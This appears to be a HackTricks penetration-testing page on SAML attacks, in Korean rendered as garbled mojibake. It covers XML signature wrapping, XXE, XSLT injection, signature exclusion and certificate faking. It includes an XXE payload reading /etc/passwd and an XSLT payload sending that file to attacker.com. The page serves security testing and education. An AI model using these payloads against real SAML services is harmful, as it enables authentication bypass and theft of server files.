# SAML ê³µê²©

## SAML ê³µê²©

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## ë„êµ¬

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): URL ë˜ëŠ” URL ëª©ë¡ì„ ì…ë ¥ë°›ì•„ SAML ì†Œë¹„ URLì„ ì¶œë ¥í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.

## XML ë¼ìš´ë“œíŠ¸ë¦½

XMLì—ì„œ XMLì˜ ì„œëª…ëœ ë¶€ë¶„ì€ ë©”ëª¨ë¦¬ì— ì €ì¥ë˜ê³ , ì¼ë¶€ ì¸ì½”ë”©/ë””ì½”ë”©ì´ ìˆ˜í–‰ë˜ë©° ì„œëª…ì´ í™•ì¸ë©ë‹ˆë‹¤. ì´ìƒì ìœ¼ë¡œëŠ” ì¸ì½”ë”©/ë””ì½”ë”©ì´ ë°ì´í„°ë¥¼ ë³€ê²½í•˜ì§€ ì•Šì•„ì•¼ í•˜ì§€ë§Œ, ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì— ë”°ë¼ **í™•ì¸ë˜ëŠ” ë°ì´í„°ì™€ ì›ë˜ ë°ì´í„°ê°€ ë™ì¼í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ì½”ë“œë¥¼ í™•ì¸í•˜ì„¸ìš”:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
í”„ë¡œê·¸ë¨ì„ REXML 3.2.4 ì´ì „ ë²„ì „ì— ëŒ€í•´ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ì¶œë ¥ì´ ë‚˜íƒ€ë‚©ë‹ˆë‹¤:
```
First child in original doc: Y
First child after round-trip: Z
```
ë‹¤ìŒì€ ìœ„ì˜ í”„ë¡œê·¸ë¨ì—ì„œ REXMLì´ ì›ë˜ XML ë¬¸ì„œë¥¼ ë³¸ ë°©ì‹ì…ë‹ˆë‹¤:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

ê·¸ë¦¬ê³  ë‹¤ìŒì€ íŒŒì‹± ë° ì§ë ¬í™” í•œ í›„ì— ë³¸ ë°©ì‹ì…ë‹ˆë‹¤:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

ì·¨ì•½ì  ë° í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML ì„œëª… ë˜í•‘ ê³µê²©

**XML ì„œëª… ë˜í•‘ ê³µê²© (XSW)**ì—ì„œëŠ” ì ëŒ€ìê°€ XML ë¬¸ì„œê°€ **ì„œëª… ìœ íš¨ì„± ê²€ì‚¬** ë° **ê¸°ëŠ¥ í˜¸ì¶œ** ë‘ ê°€ì§€ ë‹¤ë¥¸ ë‹¨ê³„ë¥¼ ê±°ì¹˜ë©´ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ XML ë¬¸ì„œ êµ¬ì¡°ë¥¼ ë³€ê²½í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. êµ¬ì²´ì ìœ¼ë¡œ, ê³µê²©ìëŠ” XML ì„œëª…ì˜ ìœ íš¨ì„±ì„ ì†ìƒì‹œí‚¤ì§€ ì•ŠëŠ” ìœ„ì¡°ëœ ìš”ì†Œë¥¼ **ì£¼ì…**í•©ë‹ˆë‹¤. ì´ ì¡°ì‘ì€ **ì‘ìš© í”„ë¡œê·¸ë¨ ë¡œì§**ì—ì„œ ë¶„ì„ë˜ëŠ” ìš”ì†Œì™€ **ì„œëª… í™•ì¸ ëª¨ë“ˆ**ì—ì„œ í™•ì¸ë˜ëŠ” ìš”ì†Œ ì‚¬ì´ì— ë¶ˆì¼ì¹˜ë¥¼ ë§Œë“¤ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ, XML ì„œëª…ì€ ê¸°ìˆ ì ìœ¼ë¡œ ìœ íš¨í•˜ê³  í™•ì¸ì„ í†µê³¼í•˜ì§€ë§Œ, ì‘ìš© í”„ë¡œê·¸ë¨ ë¡œì§ì€ **ìœ„ì¡°ëœ ìš”ì†Œ**ë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ê³µê²©ìëŠ” XML ì„œëª…ì˜ **ë¬´ê²°ì„± ë³´í˜¸** ë° **ì›ë³¸ ì¸ì¦**ì„ ìš°íšŒí•˜ì—¬ ê°ì§€ë˜ì§€ ì•Šê³  ì„ì˜ì˜ ì½˜í…ì¸ ë¥¼ **ì£¼ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ê³µê²©ì€ **[ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) ë° [ì´ ë…¼ë¬¸](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)**ì„ ê¸°ë°˜ìœ¼ë¡œ í•©ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ í•´ë‹¹ ìë£Œë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.


### XSW #1
- **ì „ëµ**: ì„œëª…ì´ í¬í•¨ëœ ìƒˆë¡œìš´ ë£¨íŠ¸ ìš”ì†Œê°€ ì¶”ê°€ë©ë‹ˆë‹¤.
- **ì˜í–¥**: ìœ íš¨ì„± ê²€ì‚¬ê¸°ëŠ” ì •ë‹¹í•œ "Response -> Assertion -> Subject"ì™€ ê³µê²©ìì˜ "ì•…ì„± Response -> Assertion -> Subject" ì‚¬ì´ì—ì„œ í˜¼ë€ìŠ¤ëŸ¬ì›Œì§ˆ ìˆ˜ ìˆìœ¼ë©°, ë°ì´í„° ë¬´ê²°ì„± ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (538).png>)

### XSW #2
- **XSW #1ê³¼ì˜ ì°¨ì´ì **: í¬ì¥ëœ ì„œëª… ëŒ€ì‹  ë¶„ë¦¬ëœ ì„œëª…ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.
- **ì˜í–¥**: XSW #1ê³¼ ìœ ì‚¬í•œ "ì•…ì„±" êµ¬ì¡°ëŠ” ë¬´ê²°ì„± ê²€ì‚¬ í›„ ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì„ ì†ì´ê¸° ìœ„í•´ ë§Œë“¤ì–´ì¡ŒìŠµë‹ˆë‹¤.


![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (539).png>)

### XSW #3
- **ì „ëµ**: ì›ë³¸ assertionê³¼ ë™ì¼í•œ ê³„ì¸µ ìˆ˜ì¤€ì—ì„œ ì•…ì„± Assertionì„ ì‘ì„±í•©ë‹ˆë‹¤.
- **ì˜í–¥**: ì•…ì„± ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ë„ë¡ ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì„ í˜¼ë€ìŠ¤ëŸ½ê²Œ ë§Œë“¤ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (540).png>)

### XSW #4
- **XSW #3ê³¼ì˜ ì°¨ì´ì **: ì›ë³¸ Assertionì´ ë³µì œëœ(ì•…ì„±) Assertionì˜ í•˜ìœ„ ìš”ì†Œê°€ ë©ë‹ˆë‹¤.
- **ì˜í–¥**: XSW #3ê³¼ ìœ ì‚¬í•˜ì§€ë§Œ XML êµ¬ì¡°ë¥¼ ë” ê³µê²©ì ìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (541).png>)

### XSW #5
- **ë…íŠ¹í•œ ì¸¡ë©´**: ì„œëª… ë° ì›ë³¸ Assertionì´ í‘œì¤€ êµ¬ì„±(í¬ì¥/í¬ì¥ë˜ì§€ ì•ŠìŒ/ë¶„ë¦¬)ì„ ë”°ë¥´ì§€ ì•ŠìŠµë‹ˆë‹¤.
- **ì˜í–¥**: ë³µì‚¬ëœ Assertionì´ ì„œëª…ì„ í¬ì¥í•˜ì—¬ ì˜ˆìƒë˜ëŠ” ë¬¸ì„œ êµ¬ì¡°ë¥¼ ìˆ˜ì •í•©ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (542).png>)

### XSW #6
- **ì „ëµ**: XSW #4 ë° #5ì™€ ìœ ì‚¬í•œ ìœ„ì¹˜ ì‚½ì…ì„ ì‚¬ìš©í•˜ì§€ë§Œ ì•½ê°„ì˜ ë³€í™”ê°€ ìˆìŠµë‹ˆë‹¤.
- **ì˜í–¥**: ë³µì‚¬ëœ Assertionì´ ì„œëª…ì„ í¬ì¥í•˜ê³ , ì„œëª…ì´ ì›ë³¸ Assertionì„ í¬ì¥í•˜ì—¬ ì¤‘ì²©ëœ ì†ì„ìˆ˜ êµ¬ì¡°ë¥¼ ë§Œë“­ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (543).png>)

### XSW #7
- **ì „ëµ**: ë³µì‚¬ëœ Assertionì„ ìì‹ìœ¼ë¡œ í¬í•¨í•˜ëŠ” í™•ì¥ ìš”ì†Œê°€ ì‚½ì…ë©ë‹ˆë‹¤.
- **ì˜í–¥**: ì´ëŠ” Extensions ìš”ì†Œì˜ ì œí•œì´ ì ì€ ìŠ¤í‚¤ë§ˆë¥¼ ì•…ìš©í•˜ì—¬ ìŠ¤í‚¤ë§ˆ ìœ íš¨ì„± ê²€ì‚¬ ëŒ€ì±…ì„ ìš°íšŒí•©ë‹ˆë‹¤. íŠ¹íˆ OpenSAMLê³¼ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì´ìš©ë©ë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (544).png>)

### XSW #8
- **XSW #7ê³¼ì˜ ì°¨ì´ì **: ë‹¤ë¥¸ ì œí•œì´ ì ì€ XML ìš”ì†Œë¥¼ ì‚¬ìš©í•˜ì—¬ ë³€í˜•ëœ ê³µê²©ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.
- **ì˜í–¥**: ì›ë³¸ Assertionì´ ì œí•œì´ ì ì€ ìš”ì†Œì˜ ìì‹ ìš”ì†Œê°€ ë˜ì–´ XSW #7ì—ì„œ ì‚¬ìš©ëœ êµ¬ì¡°ë¥¼ ë’¤ì§‘ìŠµë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (545).png>)

### ë„êµ¬

Burp í™•ì¥ í”„ë¡œê·¸ë¨ [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¥¼ ì‚¬ìš©í•˜ì—¬ ìš”ì²­ì„ êµ¬ë¬¸ ë¶„ì„í•˜ê³  ì„ íƒí•œ XSW ê³µê²©ì„ ì ìš©í•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## XXE

XXE ê³µê²©ì˜ ì¢…ë¥˜ë¥¼ ëª¨ë¥´ëŠ” ê²½ìš°, ë‹¤ìŒ í˜ì´ì§€ë¥¼ ì½ì–´ë³´ì‹­ì‹œì˜¤:

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAML ì‘ë‹µì€ **ì••ì¶• ë° base64ë¡œ ì¸ì½”ë”©ëœ XML ë¬¸ì„œ**ì´ë©°, XML ì™¸ë¶€ ì—”í‹°í‹° (XXE) ê³µê²©ì— ì·¨ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. SAML ì‘ë‹µì˜ XML êµ¬ì¡°ë¥¼ ì¡°ì‘í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” XXE ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ ë‹¤ìŒê³¼ ê°™ì´ ì‹œê°í™”ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## ë„êµ¬

[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¼ëŠ” Burp í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ SAML ìš”ì²­ì—ì„œ POCë¥¼ ìƒì„±í•˜ì—¬ ê°€ëŠ¥í•œ XXE ì·¨ì•½ì ê³¼ SAML ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ ì´ í† í¬ë¥¼ í™•ì¸í•˜ì„¸ìš”: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAMLì„ í†µí•œ XSLT

XSLTì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒìœ¼ë¡œ ì´ë™í•˜ì„¸ìš”:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

í™•ì¥ ê°€ëŠ¥í•œ ìŠ¤íƒ€ì¼ì‹œíŠ¸ ì–¸ì–´ ë³€í™˜(XSLT)ì€ XML ë¬¸ì„œë¥¼ HTML, JSON ë˜ëŠ” PDFì™€ ê°™ì€ ë‹¤ì–‘í•œ í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **XSLT ë³€í™˜ì€ ë””ì§€í„¸ ì„œëª…ì˜ ê²€ì¦ ì „ì— ìˆ˜í–‰**ë©ë‹ˆë‹¤. ì´ëŠ” ìœ íš¨í•œ ì„œëª… ì—†ì´ë„ ê³µê²©ì´ ì„±ê³µí•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ìì²´ ì„œëª… ë˜ëŠ” ì˜ëª»ëœ ì„œëª…ë§Œìœ¼ë¡œë„ ì¶©ë¶„í•©ë‹ˆë‹¤.

ì´ê³³ì—ì„œëŠ” ì´ëŸ¬í•œ ìœ í˜•ì˜ ì·¨ì•½ì ì„ í™•ì¸í•˜ê¸° ìœ„í•œ **POC**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ ì„¹ì…˜ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ ì–¸ê¸‰ëœ hacktricks í˜ì´ì§€ì—ì„œ í˜ì´ë¡œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### ë„êµ¬

[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¼ëŠ” Burp í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ SAML ìš”ì²­ì—ì„œ POCë¥¼ ìƒì„±í•˜ì—¬ ê°€ëŠ¥í•œ XSLT ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ ì´ í† í”½ì„ í™•ì¸í•˜ì„¸ìš”: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML ì„œëª… ì œì™¸ <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML ì„œëª… ì œì™¸**ëŠ” Signature ìš”ì†Œê°€ ì—†ì„ ë•Œ SAML êµ¬í˜„ì˜ ë™ì‘ì„ ê´€ì°°í•©ë‹ˆë‹¤. ì´ ìš”ì†Œê°€ ëˆ„ë½ë˜ë©´ **ì„œëª… ìœ íš¨ì„± ê²€ì‚¬ê°€ ë°œìƒí•˜ì§€ ì•Šì„ ìˆ˜** ìˆìœ¼ë¯€ë¡œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ì„œëª…ìœ¼ë¡œ í™•ì¸ë˜ëŠ” ë‚´ìš©ì„ ë³€ê²½í•˜ì—¬ ì´ë¥¼ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### ë„êµ¬ <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¼ëŠ” Burp í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. SAML ì‘ë‹µì„ ê°€ë¡œì±„ê³  `Remove Signatures`ë¥¼ í´ë¦­í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **ëª¨ë“ ** Signature ìš”ì†Œê°€ ì œê±°ë©ë‹ˆë‹¤.

ì„œëª…ì´ ì œê±°ëœ ìƒíƒœì—ì„œ ìš”ì²­ì´ ëŒ€ìƒìœ¼ë¡œ ì§„í–‰ë˜ë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ì„œë¹„ìŠ¤ì—ì„œ ì„œëª…ì´ í•„ìš”í•˜ì§€ ì•Šì€ ê²½ìš°

## ì¸ì¦ì„œ ìœ„ì¡° <a href="#certificate-faking" id="certificate-faking"></a>

ì¸ì¦ì„œ ìœ„ì¡°ëŠ” **ì„œë¹„ìŠ¤ ì œê³µì(SP)ê°€ ì‹ ë¢°í•˜ëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì‹ ì› ì œê³µì(IdP)ì— ì˜í•´ SAML ë©”ì‹œì§€ê°€ ì„œëª…ë˜ì—ˆëŠ”ì§€**ë¥¼ ì˜¬ë°”ë¥´ê²Œ í™•ì¸í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. ì´ëŠ” SAML Raiderë¥¼ ì‚¬ìš©í•˜ì—¬ SAML ì‘ë‹µ ë˜ëŠ” ì–´ì„¤ì…˜ì— **ìì²´ ì„œëª…ëœ ì¸ì¦ì„œ**ë¥¼ ì‚¬ìš©í•˜ì—¬ SPì™€ IdP ê°„ì˜ ì‹ ë¢° ê²€ì¦ í”„ë¡œì„¸ìŠ¤ë¥¼ í‰ê°€í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

### ì¸ì¦ì„œ ìœ„ì¡° ìˆ˜í–‰ ë°©ë²•
ë‹¤ìŒ ë‹¨ê³„ëŠ” [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ê°œìš”í™”í•œ ê²ƒì…ë‹ˆë‹¤.

1. SAML ì‘ë‹µì„ ê°€ë¡œì±•ë‹ˆë‹¤.
2. ì‘ë‹µì— ì„œëª…ì´ í¬í•¨ë˜ì–´ ìˆëŠ” ê²½ìš° `Send Certificate to SAML Raider Certs` ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„œë¥¼ SAML Raider Certsë¡œ ë³´ëƒ…ë‹ˆë‹¤.
3. SAML Raider Certificates íƒ­ì—ì„œ ê°€ì ¸ì˜¨ ì¸ì¦ì„œë¥¼ ì„ íƒí•˜ê³  `Save and Self-Sign`ì„ í´ë¦­í•˜ì—¬ ì›ë³¸ ì¸ì¦ì„œì˜ ìì²´ ì„œëª…ëœ ë³µì œë³¸ì„ ìƒì„±í•©ë‹ˆë‹¤.
4. Burpì˜ Proxyì—ì„œ ê°€ë¡œì±ˆ ìš”ì²­ìœ¼ë¡œ ëŒì•„ê°‘ë‹ˆë‹¤. XML ì„œëª… ë“œë¡­ë‹¤ìš´ì—ì„œ ìƒˆë¡œìš´ ìì²´ ì„œëª…ëœ ì¸ì¦ì„œë¥¼ ì„ íƒí•©ë‹ˆë‹¤.
5. `Remove Signatures` ë²„íŠ¼ìœ¼ë¡œ ê¸°ì¡´ ì„œëª…ì„ ì œê±°í•©ë‹ˆë‹¤.
6. **`(Re-)Sign Message`** ë˜ëŠ” **`(Re-)Sign Assertion`** ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆ ì¸ì¦ì„œë¡œ ë©”ì‹œì§€ ë˜ëŠ” ì–´ì„¤ì…˜ì— ì„œëª…í•©ë‹ˆë‹¤.
7. ì„œëª…ëœ ë©”ì‹œì§€ë¥¼ ì „ë‹¬í•©ë‹ˆë‹¤. ì„±ê³µì ì¸ ì¸ì¦ì€ SPê°€ ìì²´ ì„œëª…ëœ ì¸ì¦ì„œë¡œ ì„œëª…ëœ ë©”ì‹œì§€ë¥¼ ìˆ˜ë½í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í•˜ë©°, SAML ë©”ì‹œì§€ì˜ ìœ íš¨ì„± ê²€ì¦ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì ì¬ì ì¸ ì·¨ì•½ì ì„ ë“œëŸ¬ëƒ…ë‹ˆë‹¤.


## í† í° ìˆ˜ë ¹ì í˜¼ë™ / ì„œë¹„ìŠ¤ ì œê³µì ëŒ€ìƒ í˜¼ë™ <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

í† í° ìˆ˜ë ¹ì í˜¼ë™ ë° ì„œë¹„ìŠ¤ ì œê³µì ëŒ€ìƒ í˜¼ë™ì€ **ì„œë¹„ìŠ¤ ì œê³µìê°€ ì‘ë‹µì˜ ì˜ë„ëœ ìˆ˜ë ¹ìë¥¼ ì˜¬ë°”ë¥´ê²Œ ê²€ì¦í•˜ëŠ”ì§€** í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì¦‰, ì„œë¹„ìŠ¤ ì œê³µìëŠ” ë‹¤ë¥¸ ì œê³µìë¥¼ ìœ„í•´ ì‘ë‹µì´ ì˜ë„ëœ ê²½ìš° ì¸ì¦ ì‘ë‹µì„ ê±°ë¶€í•´ì•¼ í•©ë‹ˆë‹¤. ì—¬ê¸°ì—ì„œ ì¤‘ìš”í•œ ìš”ì†ŒëŠ” SAML ì‘ë‹µì˜ SubjectConfirmationData ìš”ì†Œ ë‚´ì— ìˆëŠ” ìˆ˜ë ¹ì(Recipient) í•„ë“œì…ë‹ˆë‹¤. ì´ í•„ë“œëŠ” Assertionì„ ë³´ë‚´ì•¼ í•˜ëŠ” URLì„ ì§€ì •í•©ë‹ˆë‹¤. ì‹¤ì œ ìˆ˜ë ¹ìê°€ ì˜ë„ëœ ì„œë¹„ìŠ¤ ì œê³µìì™€ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ” ê²½ìš° Assertionì€ ìœ íš¨í•˜ì§€ ì•Šì€ ê²ƒìœ¼ë¡œ ê°„ì£¼ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

#### **ì‘ë™ ë°©ì‹**

SAML í† í° ìˆ˜ë ¹ì í˜¼ë™(SAML-TRC) ê³µê²©ì´ ê°€ëŠ¥í•˜ë ¤ë©´ íŠ¹ì • ì¡°ê±´ì„ ì¶©ì¡±í•´ì•¼ í•©ë‹ˆë‹¤. ì²«ì§¸, ì„œë¹„ìŠ¤ ì œê³µì(SP-Legit)ì— ìœ íš¨í•œ ê³„ì •ì´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ë‘˜ì§¸, ëŒ€ìƒ ì„œë¹„ìŠ¤ ì œê³µì(SP-Target)ëŠ” SP-Legitì„ ì œê³µí•˜ëŠ” ë™ì¼í•œ ì‹ ì› ì œê³µìì—ì„œ í† í°ì„ ìˆ˜ë½í•´ì•¼ í•©ë‹ˆë‹¤.

